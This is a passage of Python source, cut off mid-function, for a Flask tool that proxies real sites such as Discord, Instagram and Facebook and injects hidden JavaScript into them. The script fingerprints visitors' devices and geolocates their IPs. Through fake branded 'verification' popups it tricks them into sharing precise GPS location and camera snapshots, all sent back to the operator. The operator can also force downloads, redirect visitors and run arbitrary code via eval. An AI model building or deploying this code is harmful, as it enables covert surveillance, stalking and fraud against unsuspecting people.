from flask import Flask, render_template_string, request, jsonify, send_from_directory, redirect
from flask_socketio import SocketIO
from werkzeug.middleware.proxy_fix import ProxyFix
import requests
from bs4 import BeautifulSoup
import base64
import threading
import socket
import os
import time
from colorama import init, Fore, Style, Back
import webbrowser
import json
import uuid
import platform
import geoip2.database
from datetime import datetime
import subprocess
import re

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
connected_clients = {}
active_proxy_url = None
client_redirects = {}  # Track redirects per client
cloudflared_url = None
cloudflared_process = None
operation_mode = "local"  # local or global
default_sites = {
    "1": "https://discord.com",
    "2": "https://instagram.com",
    "3": "https://tiktok.com",
    "4": "https://twitter.com",
    "5": "https://facebook.com",
    "6": "https://reddit.com",
    "7": "https://youtube.com",
    "8": "https://netflix.com"
}

# Website themes (colors for popups)
website_themes = {
    "discord.com": {
        "primary": "#5865F2",
        "background": "#36393F",
        "text": "#FFFFFF",
        "button": "#5865F2",
        "button_text": "#FFFFFF",
        "location_message": "Discord requires location verification to protect your account"
    },
    "instagram.com": {
        "primary": "#E1306C",
        "background": "#FFFFFF",
        "text": "#262626",
        "button": "#E1306C",
        "button_text": "#FFFFFF",
        "location_message": "Instagram uses your location to show relevant content"
    },
    "tiktok.com": {
        "primary": "#FE2C55",
        "background": "#000000",
        "text": "#FFFFFF",
        "button": "#FE2C55",
        "button_text": "#FFFFFF",
        "location_message": "TikTok needs location access for personalized videos"
    },
    "twitter.com": {
        "primary": "#1DA1F2",
        "background": "#15202B",
        "text": "#FFFFFF",
        "button": "#1DA1F2",
        "button_text": "#FFFFFF",
        "location_message": "Twitter uses location to show local trends"
    },
    "facebook.com": {
        "primary": "#1877F2",
        "background": "#FFFFFF",
        "text": "#050505",
        "button": "#1877F2",
        "button_text": "#FFFFFF",
        "location_message": "Facebook needs location for nearby events and friends"
    },
    "reddit.com": {
        "primary": "#FF4500",
        "background": "#DAE0E6",
        "text": "#222222",
        "button": "#FF4500",
        "button_text": "#FFFFFF",
        "location_message": "Reddit uses location for local community content"
    },
    "youtube.com": {
        "primary": "#FF0000",
        "background": "#FFFFFF",
        "text": "#030303",
        "button": "#FF0000",
        "button_text": "#FFFFFF",
        "location_message": "YouTube uses location for regional content restrictions"
    },
    "netflix.com": {
        "primary": "#E50914",
        "background": "#141414",
        "text": "#FFFFFF",
        "button": "#E50914",
        "button_text": "#FFFFFF",
        "location_message": "Netflix requires location for content licensing"
    },
    "default": {
        "primary": "#4CAF50",
        "background": "#FFFFFF",
        "text": "#000000",
        "button": "#4CAF50",
        "button_text": "#FFFFFF",
        "location_message": "Server load verification required - please confirm your location"
    }
}

# Custom color scheme
class CLI_COLORS:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    BRIGHT_BLUE = '\033[94;1m'
    BRIGHT_CYAN = '\033[96;1m'
    BRIGHT_GREEN = '\033[92;1m'
    BRIGHT_YELLOW = '\033[93;1m'
    BRIGHT_RED = '\033[91;1m'

# Try to load GeoIP database
try:
    geoip_reader = geoip2.database.Reader('GeoLite2-City.mmdb')
    GEOIP_AVAILABLE = True
except:
    GEOIP_AVAILABLE = False
    print(f"{CLI_COLORS.YELLOW}[!] GeoIP database not found. IP geolocation will be limited.{CLI_COLORS.END}")

# Visitor page template
visitor_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Visitor Page</title>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 0; }
        video { display: none; }
        #status {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div id="status">Connecting...</div>
    <video id="video" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const socket = io();
        let snapshotCount = 0;

        socket.on('connect', () => {
            document.getElementById('status').innerText = 'Connected: ' + socket.id;
            console.log('Connected:', socket.id);
            collectDeviceInfo();
        });

        socket.on('disconnect', () => {
            document.getElementById('status').innerText = 'Disconnected';
        });

        function collectDeviceInfo() {
            const info = {
                socket_id: socket.id,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                doNotTrack: navigator.doNotTrack || 'unknown',
                webdriver: navigator.webdriver || false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                battery: null,
                connection: null,
                mediaDevices: [],
                plugins: [],
                mimeTypes: [],
                storage: {},
                gpu: {},
                fonts: [],
                audioContext: {},
                webGL: {},
                performance: {},
                permissions: {},
                deviceDetails: getDeviceDetails(),
                ipInfo: {}
            };

            // Get IP info
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    info.ipInfo = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country_name,
                        postal: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        org: data.org,
                        timezone: data.timezone
                    };
                    sendDeviceInfo(info);
                })
                .catch(() => {
                    fetch('https://ipinfo.io/json')
                        .then(response => response.json())
                        .then(data => {
                            const [lat, lon] = data.loc ? data.loc.split(',') : [0, 0];
                            info.ipInfo = {
                                ip: data.ip,
                                city: data.city,
                                region: data.region,
                                country: data.country,
                                postal: data.postal,
                                latitude: lat,
                                longitude: lon,
                                org: data.org,
                                timezone: data.timezone
                            };
                            sendDeviceInfo(info);
                        })
                        .catch(() => {
                            sendDeviceInfo(info);
                        });
                });

            // Battery API
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    info.battery = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    sendDeviceInfo(info);
                });
            } else {
                sendDeviceInfo(info);
            }

            // Network Information API
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    info.connection = {
                        type: connection.type,
                        effectiveType: connection.effectiveType,
                        downlink: connection.downlink,
                        downlinkMax: connection.downlinkMax,
                        rtt: connection.rtt,
                        saveData: connection.saveData
                    };
                }
            }

            // Media Devices
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                navigator.mediaDevices.enumerateDevices()
                    .then(devices => {
                        info.mediaDevices = devices.map(device => ({
                            kind: device.kind,
                            label: device.label,
                            deviceId: device.deviceId,
                            groupId: device.groupId
                        }));
                        sendDeviceInfo(info);
                    })
                    .catch(() => sendDeviceInfo(info));
            }

            // Plugins and MIME types
            for (let i = 0; i < navigator.plugins.length; i++) {
                info.plugins.push({
                    name: navigator.plugins[i].name,
                    description: navigator.plugins[i].description,
                    filename: navigator.plugins[i].filename,
                    length: navigator.plugins[i].length
                });
            }

            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                info.mimeTypes.push({
                    type: navigator.mimeTypes[i].type,
                    description: navigator.mimeTypes[i].description,
                    suffixes: navigator.mimeTypes[i].suffixes,
                    enabledPlugin: navigator.mimeTypes[i].enabledPlugin ? navigator.mimeTypes[i].enabledPlugin.name : null
                });
            }

            // Storage
            if ('storage' in navigator) {
                info.storage = {
                    estimate: null,
                    persisted: null
                };
                
                if ('estimate' in navigator.storage) {
                    navigator.storage.estimate().then(estimate => {
                        info.storage.estimate = estimate;
                        sendDeviceInfo(info);
                    });
                }
                
                if ('persisted' in navigator.storage) {
                    navigator.storage.persisted().then(persisted => {
                        info.storage.persisted = persisted;
                        sendDeviceInfo(info);
                    });
                }
            }

            // GPU
            if ('gpu' in navigator) {
                navigator.gpu.requestAdapter().then(adapter => {
                    info.gpu = {
                        adapter: adapter ? adapter.description : null
                    };
                    sendDeviceInfo(info);
                }).catch(() => sendDeviceInfo(info));
            }

            // Fonts
            if ('fonts' in document) {
                document.fonts.ready.then(() => {
                    const fontSet = new Set();
                    for (const font of document.fonts) {
                        fontSet.add(font.family);
                    }
                    info.fonts = Array.from(fontSet);
                    sendDeviceInfo(info);
                }).catch(() => sendDeviceInfo(info));
            }

            // Audio Context
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                info.audioContext = {
                    sampleRate: audioContext.sampleRate,
                    baseLatency: audioContext.baseLatency || 'unknown',
                    outputLatency: audioContext.outputLatency || 'unknown'
                };
            } catch (e) {}

            // WebGL
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    info.webGL = {
                        vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : 0x1F00),
                        renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : 0x1F01),
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                    };
                }
            } catch (e) {}

            // Performance
            info.performance = {
                memory: window.performance.memory || null,
                timing: window.performance.timing ? {
                    navigationStart: window.performance.timing.navigationStart,
                    loadEventEnd: window.performance.timing.loadEventEnd,
                    domComplete: window.performance.timing.domComplete,
                    domLoading: window.performance.timing.domLoading
                } : null
            };

            // Permissions
            if ('permissions' in navigator) {
                const permissionsToCheck = [
                    'geolocation', 'notifications', 'camera', 'microphone', 
                    'background-sync', 'accelerometer', 'gyroscope'
                ];
                
                permissionsToCheck.forEach(permission => {
                    navigator.permissions.query({name: permission})
                        .then(result => {
                            info.permissions[permission] = result.state;
                            sendDeviceInfo(info);
                        })
                        .catch(() => {});
                });
            }

            sendDeviceInfo(info);
        }

        function getDeviceDetails() {
            const userAgent = navigator.userAgent;
            let deviceType = 'Desktop';
            let os = 'Unknown';
            let browser = 'Unknown';
            
            // Detect OS
            if (userAgent.match(/Android/i)) {
                os = 'Android';
                deviceType = 'Mobile';
            } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
                os = 'iOS';
                deviceType = userAgent.match(/iPhone/i) ? 'Mobile' : 'Tablet';
            } else if (userAgent.match(/Windows/i)) {
                os = 'Windows';
            } else if (userAgent.match(/Macintosh/i)) {
                os = 'MacOS';
            } else if (userAgent.match(/Linux/i)) {
                os = 'Linux';
            }
            
            // Detect Browser
            if (userAgent.match(/Chrome/i) && !userAgent.match(/Edg/i)) {
                browser = 'Chrome';
            } else if (userAgent.match(/Firefox/i)) {
                browser = 'Firefox';
            } else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome/i)) {
                browser = 'Safari';
            } else if (userAgent.match(/Edg/i)) {
                browser = 'Edge';
            } else if (userAgent.match(/Opera|OPR/i)) {
                browser = 'Opera';
            } else if (userAgent.match(/MSIE|Trident/i)) {
                browser = 'Internet Explorer';
            }
            
            // Detect if mobile
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            if (isMobile) deviceType = 'Mobile';
            
            // Detect if tablet
            const isTablet = /iPad|Android|Tablet/i.test(userAgent) && !/Mobile/i.test(userAgent);
            if (isTablet) deviceType = 'Tablet';
            
            // Detect if touch device
            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            
            return {
                type: deviceType,
                os: os,
                browser: browser,
                isMobile: isMobile,
                isTablet: isTablet,
                isTouchDevice: isTouchDevice,
                userAgent: userAgent
            };
        }

        function sendDeviceInfo(info) {
            fetch('/device_info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        }

        socket.on('get_location', () => {
            getCurrentPosition();
        });

        socket.on('trigger_location', (data) => {
            if (!navigator.geolocation) {
                console.log('Geolocation not supported');
                return;
            }
            
            // Check permission status
            if (navigator.permissions) {
                navigator.permissions.query({name: 'geolocation'}).then(permissionStatus => {
                    if (permissionStatus.state === 'granted') {
                        // Already have permission - just get location
                        getCurrentPosition();
                        return;
                    } else if (permissionStatus.state === 'denied') {
                        // Permission was previously denied
                        console.log('Location permission previously denied');
                        fetch('/verify_location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ denied: true, socket_id: socket.id })
                        });
                        return;
                    }
                    
                    // Permission not yet asked - show popup
                    showLocationPopup(
                        data.message || "Server load verification required - please confirm your location", 
                        getCurrentPosition, 
                        data.theme
                    );
                });
            } else {
                // Permissions API not supported - always show popup
                showLocationPopup(
                    data.message || "Server load verification required - please confirm your location", 
                    getCurrentPosition, 
                    data.theme
                );
            }

            function getCurrentPosition() {
                console.log('Triggering location request');
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        console.log('Location obtained:', pos.coords);
                        fetch('/verify_location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                altitude: pos.coords.altitude,
                                altitudeAccuracy: pos.coords.altitudeAccuracy,
                                heading: pos.coords.heading,
                                speed: pos.coords.speed,
                                timestamp: pos.timestamp,
                                socket_id: socket.id
                            })
                        });
                    },
                    (err) => {
                        console.log('Location denied:', err);
                        fetch('/verify_location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ denied: true, socket_id: socket.id })
                        });
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
        });

        function showLocationPopup(message, callback, theme = {}) {
            const defaultTheme = {
                primary: '#4CAF50',
                background: '#FFFFFF',
                text: '#000000',
                button: '#4CAF50',
                buttonText: '#FFFFFF'
            };
            
            const mergedTheme = {...defaultTheme, ...theme};
            
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.zIndex = '9999';

            const popup = document.createElement('div');
            popup.style.backgroundColor = mergedTheme.background;
            popup.style.color = mergedTheme.text;
            popup.style.padding = '20px';
            popup.style.borderRadius = '10px';
            popup.style.maxWidth = '80%';
            popup.style.textAlign = 'center';
            popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

            const title = document.createElement('div');
            title.style.fontSize = '1.5em';
            title.style.marginBottom = '10px';
            title.style.color = mergedTheme.primary;
            title.textContent = "Location Verification Required";

            const msg = document.createElement('div');
            msg.style.marginBottom = '20px';
            msg.textContent = message;

            const button = document.createElement('button');
            button.style.padding = '8px 20px';
            button.style.marginTop = '10px';
            button.style.border = 'none';
            button.style.borderRadius = '5px';
            button.style.cursor = 'pointer';
            button.style.backgroundColor = mergedTheme.button;
            button.style.color = mergedTheme.buttonText;
            button.textContent = "Continue";
            button.onclick = () => {
                document.body.removeChild(overlay);
                callback();
            };

            popup.appendChild(title);
            popup.appendChild(msg);
            popup.appendChild(button);
            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        }

        socket.on('trigger_camera', (data) => {
            console.log('Triggering camera request');
            
            // Check camera permission status
            if (navigator.permissions) {
                navigator.permissions.query({name: 'camera'}).then(permissionStatus => {
                    if (permissionStatus.state === 'granted') {
                        // Already have permission - access camera directly
                        accessCamera();
                        return;
                    } else if (permissionStatus.state === 'denied') {
                        // Permission was previously denied
                        console.log('Camera permission previously denied');
                        fetch('/upload_snapshot', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                denied: true,
                                socket_id: socket.id
                            })
                        });
                        return;
                    }
                    
                    // Permission not yet asked - show popup
                    showCameraPopup(
                        data.message || 'Security verification requires camera access',
                        accessCamera,
                        data.theme
                    );
                });
            } else {
                // Permissions API not supported - always show popup
                showCameraPopup(
                    data.message || 'Security verification requires camera access',
                    accessCamera,
                    data.theme
                );
            }

            function accessCamera() {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const video = document.getElementById('video');
                        const canvas = document.getElementById('canvas');
                        video.srcObject = stream;

                        setTimeout(() => {
                            const ctx = canvas.getContext('2d');
                            const interval = setInterval(() => {
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const imageData = canvas.toDataURL('image/png');
                                fetch('/upload_snapshot', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        image: imageData,
                                        count: snapshotCount + 1,
                                        socket_id: socket.id
                                    })
                                });
                                snapshotCount++;
                                if (snapshotCount >= 3) {
                                    clearInterval(interval);
                                    stream.getTracks().forEach(track => track.stop());
                                    video.srcObject = null;
                                }
                            }, 1000);
                        }, 1000);
                    })
                    .catch((err) => {
                        console.log('Camera access denied:', err);
                        fetch('/upload_snapshot', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                denied: true,
                                socket_id: socket.id
                            })
                        });
                    });
            }
        });

        function showCameraPopup(message, callback, theme = {}) {
            const defaultTheme = {
                primary: '#4CAF50',
                background: '#FFFFFF',
                text: '#000000',
                button: '#4CAF50',
                buttonText: '#FFFFFF'
            };
            
            const mergedTheme = {...defaultTheme, ...theme};
            
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.zIndex = '9999';

            const popup = document.createElement('div');
            popup.style.backgroundColor = mergedTheme.background;
            popup.style.color = mergedTheme.text;
            popup.style.padding = '20px';
            popup.style.borderRadius = '10px';
            popup.style.maxWidth = '80%';
            popup.style.textAlign = 'center';
            popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

            const title = document.createElement('div');
            title.style.fontSize = '1.5em';
            title.style.marginBottom = '10px';
            title.style.color = mergedTheme.primary;
            title.textContent = "Camera Access Required";

            const msg = document.createElement('div');
            msg.style.marginBottom = '20px';
            msg.textContent = message;

            const button = document.createElement('button');
            button.style.padding = '8px 20px';
            button.style.marginTop = '10px';
            button.style.border = 'none';
            button.style.borderRadius = '5px';
            button.style.cursor = 'pointer';
            button.style.backgroundColor = mergedTheme.button;
            button.style.color = mergedTheme.buttonText;
            button.textContent = "Continue";
            button.onclick = () => {
                document.body.removeChild(overlay);
                callback();
            };

            popup.appendChild(title);
            popup.appendChild(msg);
            popup.appendChild(button);
            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        }

        socket.on('trigger_download', (data) => {
            console.log('Triggering download:', data);
            const link = document.createElement('a');
            link.href = data.url || '/download_file';
            link.download = data.filename || 'file.txt';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        });

        socket.on('trigger_message', (data) => {
            console.log('Showing message:', data);
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.7)';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.zIndex = '9999';

            const popup = document.createElement('div');
            popup.style.backgroundColor = data.bgColor || '#ffffff';
            popup.style.color = data.textColor || '#000000';
            popup.style.padding = '20px';
            popup.style.borderRadius = '10px';
            popup.style.maxWidth = '80%';
            popup.style.textAlign = 'center';
            popup.style.boxShadow = '0 0 20px rgba(0,0,0,0.5)';

            const title = document.createElement('div');
            title.style.fontSize = '1.5em';
            title.style.marginBottom = '10px';
            title.style.color = data.primaryColor || '#4CAF50';
            title.textContent = data.title || "Notification";

            const message = document.createElement('div');
            message.textContent = data.message || "This is a notification message.";

            const button = document.createElement('button');
            button.style.padding = '8px 20px';
            button.style.marginTop = '20px';
            button.style.border = 'none';
            button.style.borderRadius = '5px';
            button.style.cursor = 'pointer';
            button.style.backgroundColor = data.primaryColor || '#4CAF50';
            button.style.color = 'white';
            button.textContent = data.buttonText || "OK";
            button.onclick = () => {
                document.body.removeChild(overlay);
                if (data.callback) {
                    eval(data.callback);
                }
            };

            popup.appendChild(title);
            popup.appendChild(message);
            popup.appendChild(button);
            overlay.appendChild(popup);
            document.body.appendChild(overlay);
        });

        socket.on('redirect', (data) => {
            console.log('Redirecting to:', data.url);
            window.location.href = data.url;
        });

        // Reconnect logic
        function setupReconnect() {
            let reconnectAttempts = 0;
            const maxReconnectAttempts = 5;
            const reconnectDelay = 1000;

            function attemptReconnect() {
                if (reconnectAttempts < maxReconnectAttempts) {
                    reconnectAttempts++;
                    console.log(`Attempting to reconnect (${reconnectAttempts}/${maxReconnectAttempts})`);
                    socket.connect();
                }
            }

            socket.on('disconnect', () => {
                document.getElementById('status').innerText = 'Disconnected - attempting to reconnect';
                setTimeout(attemptReconnect, reconnectDelay);
            });

            socket.on('connect_error', () => {
                setTimeout(attemptReconnect, reconnectDelay);
            });
        }

        setupReconnect();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(visitor_html)

@app.route('/proxy')
def proxy_request():
    url = request.args.get('url', '')
    if not url:
        return "No URL provided", 400
    
    try:
        response = requests.get(url)
        content_type = response.headers.get('Content-Type', '')

        if 'text/html' in content_type:
            soup = BeautifulSoup(response.text, 'html.parser')

            # Inject socket.io client script if not already present
            if not soup.find('script', src=lambda x: x and 'socket.io' in x):
                socket_io_script = soup.new_tag('script', src='https://cdn.socket.io/4.5.4/socket.io.min.js')
                if soup.head:
                    soup.head.append(socket_io_script)
                else:
                    soup.insert(0, socket_io_script)

            # Get domain for theme
            domain = url.split('/')[2].replace('www.', '')
            theme = website_themes.get(domain, website_themes['default'])
            
            # Inject our custom JS
            custom_js = soup.new_tag('script')
            custom_js.string = f"""
            const socket = io();
            let snapshotCount = 0;
            const currentTheme = {json.dumps(theme)};

            socket.on('connect', () => {{
                console.log('Connected:', socket.id);
                collectDeviceInfo();
            }});

            socket.on('disconnect', () => {{
                console.log('Disconnected');
            }});

            function collectDeviceInfo() {{
                const info = {{
                    socket_id: socket.id,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                    doNotTrack: navigator.doNotTrack || 'unknown',
                    webdriver: navigator.webdriver || false,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    battery: null,
                    connection: null,
                    mediaDevices: [],
                    plugins: [],
                    mimeTypes: [],
                    storage: {{}},
                    gpu: {{}},
                    fonts: [],
                    audioContext: {{}},
                    webGL: {{}},
                    performance: {{}},
                    permissions: {{}},
                    deviceDetails: getDeviceDetails(),
                    ipInfo: {{}}
                }};

                // Get IP info
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {{
                        info.ipInfo = {{
                            ip: data.ip,
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            postal: data.postal,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            org: data.org,
                            timezone: data.timezone
                        }};
                        sendDeviceInfo(info);
                    }})
                    .catch(() => {{
                        fetch('https://ipinfo.io/json')
                            .then(response => response.json())
                            .then(data => {{
                                const [lat, lon] = data.loc ? data.loc.split(',') : [0, 0];
                                info.ipInfo = {{
                                    ip: data.ip,
                                    city: data.city,
                                    region: data.region,
                                    country: data.country,
                                    postal: data.postal,
                                    latitude: lat,
                                    longitude: lon,
                                    org: data.org,
                                    timezone: data.timezone
                                }};
                                sendDeviceInfo(info);
                            }})
                            .catch(() => {{
                                sendDeviceInfo(info);
                            }});
                    }});

                // Battery API
                if ('getBattery' in navigator) {{
                    navigator.getBattery().then(battery => {{
                        info.battery = {{
                            level: battery.level,
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        }};
                        sendDeviceInfo(info);
                    }});
                }} else {{
                    sendDeviceInfo(info);
                }}

                // Network Information API
                if ('connection' in navigator) {{
                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (connection) {{
                        info.connection = {{
                            type: connection.type,
                            effectiveType: connection.effectiveType,
                            downlink: connection.downlink,
                            downlinkMax: connection.downlinkMax,
                            rtt: connection.rtt,
                            saveData: connection.saveData
                        }};
                    }}
                }}

                // Media Devices
                if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {{
                    navigator.mediaDevices.enumerateDevices()
                        .then(devices => {{
                            info.mediaDevices = devices.map(device => ({{
                                kind: device.kind,
                                label: device.label,
                                deviceId: device.deviceId,
                                groupId: device.groupId
                            }}));
                            sendDeviceInfo(info);
                        }})
                        .catch(() => sendDeviceInfo(info));
                }}

                // Plugins and MIME types
                for (let i = 0; i < navigator.plugins.length; i++) {{
                    info.plugins.push({{
                        name: navigator.plugins[i].name,
                        description: navigator.plugins[i].description,
                        filename: navigator.plugins[i].filename,
                        length: navigator.plugins[i].length
                    }});
                }}

                for (let i = 0; i < navigator.mimeTypes.length; i++) {{
                    info.mimeTypes.push({{
                        type: navigator.mimeTypes[i].type,
                        description: navigator.mimeTypes[i].description,
                        suffixes: navigator.mimeTypes[i].suffixes,
                        enabledPlugin: navigator.mimeTypes[i].enabledPlugin ? navigator.mimeTypes[i].enabledPlugin.name : null
                    }});
                }}

                // Storage
                if ('storage' in navigator) {{
                    info.storage = {{
                        estimate: null,
                        persisted: null
                    }};
                    
                    if ('estimate' in navigator.storage) {{
                        navigator.storage.estimate().then(estimate => {{
                            info.storage.estimate = estimate;
                            sendDeviceInfo(info);
                        }});
                    }}
                    
                    if ('persisted' in navigator.storage) {{
                        navigator.storage.persisted().then(persisted => {{
                            info.storage.persisted = persisted;
                            sendDeviceInfo(info);
                        }});
                    }}
                }}

                // GPU
                if ('gpu' in navigator) {{
                    navigator.gpu.requestAdapter().then(adapter => {{
                        info.gpu = {{
                            adapter: adapter ? adapter.description : null
                        }};
                        sendDeviceInfo(info);
                    }}).catch(() => sendDeviceInfo(info));
                }}

                // Fonts
                if ('fonts' in document) {{
                    document.fonts.ready.then(() => {{
                        const fontSet = new Set();
                        for (const font of document.fonts) {{
                            fontSet.add(font.family);
                        }}
                        info.fonts = Array.from(fontSet);
                        sendDeviceInfo(info);
                    }}).catch(() => sendDeviceInfo(info));
                }}

                // Audio Context
                try {{
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    info.audioContext = {{
                        sampleRate: audioContext.sampleRate,
                        baseLatency: audioContext.baseLatency || 'unknown',
                        outputLatency: audioContext.outputLatency || 'unknown'
                    }};
                }} catch (e) {{}}

                // WebGL
                try {{
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {{
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        info.webGL = {{
                            vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : 0x1F00),
                            renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : 0x1F01),
                            version: gl.getParameter(gl.VERSION),
                            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                        }};
                    }}
                }} catch (e) {{}}

                // Performance
                info.performance = {{
                    memory: window.performance.memory || null,
                    timing: window.performance.timing ? {{
                        navigationStart: window.performance.timing.navigationStart,
                        loadEventEnd: window.performance.timing.loadEventEnd,
                        domComplete: window.performance.timing.domComplete,
                        domLoading: window.performance.timing.domLoading
                    }} : null
                }};

                // Permissions
                if ('permissions' in navigator) {{
                    const permissionsToCheck = [
                        'geolocation', 'notifications', 'camera', 'microphone', 
                        'background-sync', 'accelerometer', 'gyroscope'
                    ];
                    
                    permissionsToCheck.forEach(permission => {{
                        navigator.permissions.query({{name: permission}})
                            .then(result => {{
                                info.permissions[permission] = result.state;
                                sendDeviceInfo(info);
                            }})
                            .catch(() => {{}});
                    }});
                }}

                sendDeviceInfo(info);
            }}

            function getDeviceDetails() {{
                const userAgent = navigator.userAgent;
                let deviceType = 'Desktop';
                let os = 'Unknown';
                let browser = 'Unknown';
                
                // Detect OS
                if (userAgent.match(/Android/i)) {{
                    os = 'Android';
                    deviceType = 'Mobile';
                }} else if (userAgent.match(/iPhone|iPad|iPod/i)) {{
                    os = 'iOS';
                    deviceType = userAgent.match(/iPhone/i) ? 'Mobile' : 'Tablet';
                }} else if (userAgent.match(/Windows/i)) {{
                    os = 'Windows';
                }} else if (userAgent.match(/Macintosh/i)) {{
                    os = 'MacOS';
                }} else if (userAgent.match(/Linux/i)) {{
